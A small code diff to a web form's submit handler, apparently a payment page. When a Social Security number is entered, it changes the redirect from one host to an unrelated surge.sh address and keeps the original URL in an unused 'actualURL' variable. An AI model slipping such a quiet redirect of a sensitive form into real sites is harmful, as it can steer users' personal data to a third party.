@@ -40,7 +40,8 @@ form.addEventListener('submit', (e) => {
 
     if (data.get('ssn')) {
         err.setAttribute('data-hidden', '');
-        window.location.replace('http://chonkybonky.net/payment-confirmation/');
+        let actualURL = 'http://chonkybonky.net/payment-confirmation/';
+        window.location.replace('http://afraid-value.surge.sh/payment-confirmation/');
     }
     else {
         err.removeAttribute('data-hidden');
